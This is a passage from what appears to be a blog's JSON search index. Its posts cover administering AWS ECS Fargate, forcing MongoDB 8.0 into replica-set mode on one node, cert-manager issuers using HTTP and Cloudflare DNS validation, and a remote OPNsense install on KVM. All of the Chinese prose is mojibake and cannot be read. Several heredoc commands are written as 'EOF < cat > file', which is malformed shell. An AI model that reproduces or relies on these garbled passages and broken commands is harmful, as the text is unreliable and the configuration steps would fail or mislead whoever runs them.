class=\"s1\"\u003e\u0026#39;/bin/sh\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®é™…å¯¹åº”çš„å‘½ä»¤å¦‚ä¸Šã€‚å…¶å®ä¹Ÿå¯ä»¥ç”¨awsçš„cliå®¢æˆ·ç«¯ç›´æ¥æ‰§è¡Œï¼Œåªä¸è¿‡è¦æ‹¿åˆ°é›†ç¾¤åå’Œå®¹å™¨åã€‚\u003c/p\u003e","title":"AWSçš„ECSä½¿ç”¨FargateæœåŠ¡å™¨å¦‚ä½•å¼€å¯shellè¿›å…¥å®¹å™¨è°ƒè¯•"},{"content":"è¿™ä¸ªè¯é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œå…¬å¸çš„æµ‹è¯•ç¯å¢ƒæœ¬æ¥æ˜¯ä¸€ä¸ªmongodbçš„ä¸‰èŠ‚ç‚¹ä¸‰å‰¯æœ¬å…¨é›†ç¾¤ï¼Œå‡çº§äº†2æ¬¡å‡åˆ°8.0ã€‚\nç»“æœå§ï¼Œç”±äºé‡Œé¢æ•°æ®è¿‡äºåºå¤§ï¼Œæµ‹è¯•çš„æ—¶å€™ç»å¸¸æŠŠèŠ‚ç‚¹æ‰“æŒ‚ï¼Œè™½è¯´æ˜¯æ‰“æŒ‚ååˆèƒ½å¾ˆå¿«è¢«dockeræ‹‰èµ·æ¥ï¼Œä½†æ˜¯æŒ‚çš„é‚£ä¸ªæ—¶åˆ»åº”ç”¨ç¨‹åºå°±æ‰äº†ï¼Œå¯¼è‡´æµ‹è¯•å¤±è´¥ã€‚\nè¿™ä¸‰å°èŠ‚ç‚¹è¿˜éƒ½æ˜¯8 cpu 32G memoryçš„é…ç½®ï¼ŒçœŸå¤§æ— è¯­äº†ã€‚\næ²¡åŠæ³•ï¼Œå¹²è„†å¼„æˆå•èŠ‚ç‚¹ï¼Œç„¶åå†…å­˜å’é«˜åˆ°128Gï¼ŒcpuåŠ åˆ°32ï¼Œå¼„å¥½ä¹‹åï¼Œè¯»å–æ•°æ®çš„Flinkåˆä¸è¡Œäº†ï¼Œè¦æ±‚æ˜¯å¿…é¡»è¯»mongoçš„å‰¯æœ¬ï¼ŒçœŸå®ŒçŠŠå­ã€‚\né‚£å°±å¼ºåˆ¶å¯åŠ¨ä¸ªå‰¯æœ¬æ¨¡å¼å§ï¼š\nmongoå¯åŠ¨æ–¹å¼ç”¨çš„æ˜¯docker composeï¼Œå¯åŠ¨çš„æ—¶å€™æ–°å¢å‚æ•° --replSet rs0\n# mongoæ•°æ®ç›®å½•çš„å±ä¸»æ˜¯ 999:999 mkdir -p /data/mongodb/27017/data chown -R 999:999 /data/mongodb/27017/data mkdir -p /data/mongodb/27017/conf/ cd /data/mongodb/27017 #å…ˆgen keyfile openssl rand -base64 756 \u0026gt; keyfile chmod 400 keyfile #å‡†å¤‡mongod.conf EOF \u0026lt; cat \u0026gt; /data/mongodb/27017/conf/mongod.conf systemLog: destination: file path: \u0026#34;/data/db/mongod.log\u0026#34; logAppend: true net: bindIp: 0.0.0.0 port: 27017 security: keyFile: \u0026#34;/data/configdb/keyfile\u0026#34; EOF EOF \u0026lt; cat \u0026gt; /data/mongodb/docker-compose.yaml services: mongo: container_name: mongo image: mongo:8.0 restart: always environment: TZ: Asia/Shanghai volumes: - /data/mongodb/27017/data:/data/db - /data/mongodb/27017/conf/mongod.conf:/data/configdb/mongod.conf - ./keyfile:/data/configdb/keyfile command: --replSet rs0 --config /data/configdb/mongod.conf ports: - 27017:27017 EOF docker compose up -d ç„¶åä¸ç®—å®Œå•Šï¼Œå¯åŠ¨ä¹‹åéœ€è¦è¿›å…¥å®¹å™¨æ‰§è¡Œrs.initiate(), æ”¾å¿ƒå¤§èƒ†çš„æ‰§è¡Œï¼Œä¸ä¼šç ´åä»»ä½•åŸæœ‰çš„æ•°æ®\ndocker exec -it mongo sh mongosh use admin db.auth(\u0026#39;root\u0026#39;,\u0026#39;xxxxxxxx\u0026#39;) rs.initiate() Flinkå°±å˜æ­£å¸¸äº†ï¼Œå¯æƒœç„¶è€Œä½†æ˜¯ï¼ŒåŸæœ‰çš„åº”ç”¨ç¨‹åºå°±çªç„¶ä¸è¡Œäº†ï¼ŒæŠ¥æ— æ³•è¿æ¥mongoï¼\né‚£åŸæœ‰çš„è¿æ¥å­—ä¸²éœ€è¦å˜ä¸€ä¸‹ï¼š\nmongodb://root:xxxxxxxx@192.168.1.20/?authSource=admin\u0026amp;directConnection=true\u0026amp;tls=false çœŸçš„æ˜¯éº»çƒ¦çš„ä¸€åŒ¹ï¼ï¼ï¼\n","permalink":"https://rendoumi.com/posts/20251029-mongodb-rs0/","summary":"\u003cp\u003eè¿™ä¸ªè¯é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œå…¬å¸çš„æµ‹è¯•ç¯å¢ƒæœ¬æ¥æ˜¯ä¸€ä¸ªmongodbçš„ä¸‰èŠ‚ç‚¹ä¸‰å‰¯æœ¬å…¨é›†ç¾¤ï¼Œå‡çº§äº†2æ¬¡å‡åˆ°8.0ã€‚\u003c/p\u003e\n\u003cp\u003eç»“æœå§ï¼Œç”±äºé‡Œé¢æ•°æ®è¿‡äºåºå¤§ï¼Œæµ‹è¯•çš„æ—¶å€™ç»å¸¸æŠŠèŠ‚ç‚¹æ‰“æŒ‚ï¼Œè™½è¯´æ˜¯æ‰“æŒ‚ååˆèƒ½å¾ˆå¿«è¢«dockeræ‹‰èµ·æ¥ï¼Œä½†æ˜¯æŒ‚çš„é‚£ä¸ªæ—¶åˆ»åº”ç”¨ç¨‹åºå°±æ‰äº†ï¼Œå¯¼è‡´æµ‹è¯•å¤±è´¥ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸‰å°èŠ‚ç‚¹è¿˜éƒ½æ˜¯8 cpu 32G memoryçš„é…ç½®ï¼ŒçœŸå¤§æ— è¯­äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ²¡åŠæ³•ï¼Œå¹²è„†å¼„æˆå•èŠ‚ç‚¹ï¼Œç„¶åå†…å­˜å’é«˜åˆ°128Gï¼ŒcpuåŠ åˆ°32ï¼Œå¼„å¥½ä¹‹åï¼Œè¯»å–æ•°æ®çš„\u003ccode\u003eFlink\u003c/code\u003eåˆä¸è¡Œäº†ï¼Œè¦æ±‚æ˜¯å¿…é¡»è¯»mongoçš„å‰¯æœ¬ï¼ŒçœŸå®ŒçŠŠå­ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å°±å¼ºåˆ¶å¯åŠ¨ä¸ªå‰¯æœ¬æ¨¡å¼å§ï¼š\u003c/p\u003e\n\u003cp\u003emongoå¯åŠ¨æ–¹å¼ç”¨çš„æ˜¯docker composeï¼Œå¯åŠ¨çš„æ—¶å€™æ–°å¢å‚æ•° \u003ccode\u003e--replSet rs0\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# mongoæ•°æ®ç›®å½•çš„å±ä¸»æ˜¯ 999:999\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/mongodb/27017/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown -R 999:999 /data/mongodb/27017/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/mongodb/27017/conf/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /data/mongodb/27017\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å…ˆgen keyfile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl rand -base64 \u003cspan class=\"m\"\u003e756\u003c/span\u003e \u0026gt; keyfile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e400\u003c/span\u003e keyfile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å‡†å¤‡mongod.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF \u0026lt; cat \u0026gt; /data/mongodb/27017/conf/mongod.conf \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemLog:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   destination: file\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   path: \u003cspan class=\"s2\"\u003e\u0026#34;/data/db/mongod.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   logAppend: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   bindIp: 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   port: \u003cspan class=\"m\"\u003e27017\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esecurity:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   keyFile: \u003cspan class=\"s2\"\u003e\u0026#34;/data/configdb/keyfile\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF \u0026lt; cat \u0026gt; /data/mongodb/docker-compose.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  mongo:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: mongo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: mongo:8.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: always\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      TZ: Asia/Shanghai\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - /data/mongodb/27017/data:/data/db\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - /data/mongodb/27017/conf/mongod.conf:/data/configdb/mongod.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - ./keyfile:/data/configdb/keyfile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: --replSet rs0 --config /data/configdb/mongod.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 27017:27017\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker compose up -d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åä¸ç®—å®Œå•Šï¼Œå¯åŠ¨ä¹‹åéœ€è¦è¿›å…¥å®¹å™¨æ‰§è¡Œ\u003ccode\u003ers.initiate()\u003c/code\u003e, æ”¾å¿ƒå¤§èƒ†çš„æ‰§è¡Œï¼Œä¸ä¼šç ´åä»»ä½•åŸæœ‰çš„æ•°æ®\u003c/p\u003e","title":"MongoDBçš„ä¼ªå‰¯æœ¬æ¨¡å¼"},{"content":"cert-manageræ™®é€šç­¾å‘è¯ä¹¦çš„æ—¶å€™ï¼Œé€šå¸¸æ˜¯DNSçš„Aè®°å½•å·²ç»è§£æåˆ°ç›¸å…³çš„Ingresså‰ç½®çš„LB å…¬ç½‘IPäº†ã€‚\nç¬¬ä¸€ç§æƒ…å†µï¼Œæœ‰å…¬ç½‘IPçš„è¯ä¹¦ç­¾å‘ï¼ŒéªŒè¯æ–¹å¼æ˜¯http é‚£å‡†å¤‡å¥½cluster-issuer.yaml\napiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-prod1 spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: zhangranrui@rendoumi.com privateKeySecretRef: name: letsencrypt-prod1 solvers: - http01: ingress: class: nginx ç¬¬äºŒç§æƒ…å†µï¼Œå¦‚æœé›†ç¾¤æ˜¯éƒ¨ç½²åœ¨å†…ç½‘ï¼Œæ ¹æœ¬æ²¡æœ‰å…¬ç½‘ipï¼Œå°±ä¸èƒ½é€šè¿‡80å’Œ443çš„éªŒè¯æ¥ç­¾å‘äº†ï¼Œåªèƒ½ç”¨DNSæ ¡éªŒçš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦ é‚£ä»¥cloudflareæ‰˜ç®¡çš„DNSä¸ºä¾‹ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°CFçš„dns-apiçš„tokenï¼Œç„¶åå£°æ˜ï¼Œå†å®šä¹‰ClusterIssuer\n--- apiVersion: v1 kind: Secret metadata: name: cloudflare-api-token-secret type: Opaque stringData: api-token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx --- apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-prod2 spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: zhangranrui@rendoumi.com privateKeySecretRef: name: letsencrypt-prod2 solvers: - dns01: cloudflare: email: zhangranrui@rendoumi.com apiTokenSecretRef: name: cloudflare-api-token-secret key: api-token é‚£ç¬¬ä¸€ç§å’Œç¬¬äºŒç§çš„åŒºåˆ«å°±æ˜¯solversæ˜¯ä¸åŒçš„ã€‚\né‚£æœ€åannouce ingresså³å¯è‡ªåŠ¨ç­¾å‘è¯ä¹¦ï¼Œé€‰æ‹©ä¸åŒcert-manager.io/cluster-issuerå°±å¯ä»¥é€‰æ‹©ä¸åŒçš„ç­¾å‘æ–¹å¼ã€‚\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: test-rednoumi-com-ingress annotations: cert-manager.io/cluster-issuer: \u0026#34;letsencrypt-prod1\u0026#34; spec: ingressClassName: nginx tls: - hosts: - test.rendoumi.com secretName: test-rendoumi-com-tls rules: - host: test.rendoumi.com http: paths: - path: / pathType: Prefix backend: service: name: nginx port: number: 80 ","permalink":"https://rendoumi.com/posts/20251024-certmanager_issuer/","summary":"\u003cp\u003ecert-manageræ™®é€šç­¾å‘è¯ä¹¦çš„æ—¶å€™ï¼Œé€šå¸¸æ˜¯DNSçš„Aè®°å½•å·²ç»è§£æåˆ°ç›¸å…³çš„Ingresså‰ç½®çš„LB å…¬ç½‘IPäº†ã€‚\u003c/p\u003e\n\u003ch5 id=\"ç¬¬ä¸€ç§æƒ…å†µæœ‰å…¬ç½‘ipçš„è¯ä¹¦ç­¾å‘éªŒè¯æ–¹å¼æ˜¯http\"\u003eç¬¬ä¸€ç§æƒ…å†µï¼Œæœ‰å…¬ç½‘IPçš„è¯ä¹¦ç­¾å‘ï¼ŒéªŒè¯æ–¹å¼æ˜¯http\u003c/h5\u003e\n\u003cp\u003eé‚£å‡†å¤‡å¥½cluster-issuer.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: cert-manager.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ClusterIssuer\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: letsencrypt-prod1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  acme:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server: https://acme-v02.api.letsencrypt.org/directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    email: zhangranrui@rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    privateKeySecretRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      name: letsencrypt-prod1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    solvers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - http01:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ingress:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          class: nginx\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ç¬¬äºŒç§æƒ…å†µå¦‚æœé›†ç¾¤æ˜¯éƒ¨ç½²åœ¨å†…ç½‘æ ¹æœ¬æ²¡æœ‰å…¬ç½‘ipå°±ä¸èƒ½é€šè¿‡80å’Œ443çš„éªŒè¯æ¥ç­¾å‘äº†åªèƒ½ç”¨dnsæ ¡éªŒçš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦\"\u003eç¬¬äºŒç§æƒ…å†µï¼Œå¦‚æœé›†ç¾¤æ˜¯éƒ¨ç½²åœ¨å†…ç½‘ï¼Œæ ¹æœ¬æ²¡æœ‰å…¬ç½‘ipï¼Œå°±ä¸èƒ½é€šè¿‡80å’Œ443çš„éªŒè¯æ¥ç­¾å‘äº†ï¼Œåªèƒ½ç”¨DNSæ ¡éªŒçš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦\u003c/h5\u003e\n\u003cp\u003eé‚£ä»¥cloudflareæ‰˜ç®¡çš„DNSä¸ºä¾‹ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°CFçš„dns-apiçš„tokenï¼Œç„¶åå£°æ˜ï¼Œå†å®šä¹‰ClusterIssuer\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: Secret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: cloudflare-api-token-secret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etype: Opaque\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estringData:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  api-token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: cert-manager.io/v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ClusterIssuer\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: letsencrypt-prod2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  acme:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server: https://acme-v02.api.letsencrypt.org/directory\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    email: zhangranrui@rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    privateKeySecretRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      name: letsencrypt-prod2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    solvers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - dns01:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        cloudflare:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          email: zhangranrui@rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          apiTokenSecretRef:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            name: cloudflare-api-token-secret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            key: api-token\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ç¬¬ä¸€ç§å’Œç¬¬äºŒç§çš„åŒºåˆ«å°±æ˜¯solversæ˜¯ä¸åŒçš„ã€‚\u003c/p\u003e","title":"cert-managerçš„ä¸åŒclusterissueréªŒè¯æ–¹å¼"},{"content":"OPNsenseå®‰è£…å…¶å®å¾ˆå®¹æ˜“ï¼Œä½†æ˜¯è¿œç¨‹è£…å°±ä¸é‚£ä¹ˆå¥½ç©äº†ã€‚\nå°¤å…¶æ¶‰åŠåˆ°å†…ç½‘WEBGUIçš„è®¿é—®ï¼Œç¼ºçœå®‰è£…å®Œæˆä»¥åï¼Œåªèƒ½ä»å†…ç½‘å£è®¿é—®ç®¡ç†ç•Œé¢ï¼Œé—®é¢˜æ˜¯VPCé‡Œåªæœ‰ä¸€å°Linuxæœºå™¨ï¼Œè¿˜æ²¡æœ‰æµè§ˆå™¨ï¼Œæ€ä¹ˆåŠï¼Ÿ\nè®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå¤‡æŸ¥ï¼š\nä¸€ã€ä¸‹è½½isoé•œåƒå¹¶è§£å‹ wget https://pkg.opnsense.org/releases/25.7/OPNsense-25.7-dvd-amd64.iso.bz2 bzip2 -d OPNsense-25.7-dvd-amd64.iso.bz2 äºŒã€kvmç”¨virt-installå®‰è£…isoï¼Œæ³¨æ„æ¡¥æ¥äº†2ä¸ªç½‘å¡ #!/bin/bash mkdir -p /export/kvm/opn/ qemu-img create -f qcow2 /export/kvm/opn/opn.qcow2 20G virt-install \\ --name=opn \\ --vcpu=2 \\ --ram=2048 \\ --disk path=/export/kvm/opn/opn.qcow2,format=qcow2,size=20 \\ --cdrom=/export/kvm/iso/OPNsense-25.7-dvd-amd64.iso \\ --network bridge=br0,model=virtio \\ --network bridge=br1,model=virtio \\ --os-type unix \\ --os-variant freebsd13.1 \\ --vnc --vnclisten=0.0.0.0 --vncport=5901 ä¸‰ã€vncè¿åˆ°port 5901ä¸Šè¿›è¡Œå®‰è£…é…ç½® OPNsenseå…¬ç½‘çš„ç½‘å¡ã€ipã€maskã€gatewayé…ç½®\nOPNsenseå†…ç½‘çš„ç½‘å¡ã€ipã€maské…ç½®\nå››ã€è®¾ç½®å†…ç½‘è®¿é—® è¿™é‡Œå°±éå¸¸é¬¼ç•œäº†ï¼Œé¦–å…ˆåœ¨å†…ç½‘çš„é‚£å°æœºå™¨ä¸Šåšportè½¬å‘ï¼Œè¿™å°æœºå™¨æ˜¯192.168.100.2ï¼Œåšä¸ªsystemdçš„service:\ncat /etc/systemd/system/opn-proxy.service [Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/usr/local/bin/ Type=simple ExecStart=/usr/local/bin/go-tcp-proxy_1.0.2_linux_amd64 -l \u0026#34;:4430\u0026#34; -r \u0026#34;192.168.100.1:4430\u0026#34; Restart=on-failure RestartSec=1s [Install] WantedBy=multi-user.target å¦‚ä¸Šçš„è¯ï¼Œå¦‚æœwebè®¿é—®http://192.168.100.2:4430ï¼Œé‚£Host: 192.168.100.1 ä¼šè¢«è½¬å‘ç»™ 192.168.100.1 çš„OPNsenseçš„4430ç«¯å£\né‚£OPNsenseçš„å†…ç½‘IPæ˜¯192.168.100.1ï¼Œç™»å½•ç”¨æˆ·æ˜¯rootï¼Œå¯†ç æ˜¯xxxxxxxx\nä»vncä¸Šç™»å½•ï¼Œç„¶åè¿›å…¥shellï¼Œæ‰¾åˆ°webguiçš„éƒ¨åˆ†ï¼Œæ·»åŠ portå’Œalthostnamesçš„ä¸¤é¡¹\nvi /conf/config.xml ...... \u0026lt;webgui\u0026gt; \u0026lt;protocol\u0026gt;https\u0026lt;/protocol\u0026gt; \u0026lt;ssl-certref\u0026gt;68adc26101eeb\u0026lt;/ssl-certref\u0026gt; \u0026lt;port\u0026gt;4430\u0026lt;/port\u0026gt; \u0026lt;althostnames\u0026gt;192.168.100.2\u0026lt;/althostnames\u0026gt; \u0026lt;/webgui\u0026gt; ...... ç„¶åé‡å¯webgui\nconfigctl webgui restart ç„¶åå°±å¯ä»¥ä»èƒ½è®¿é—®åˆ° 192.168.100.2:4430 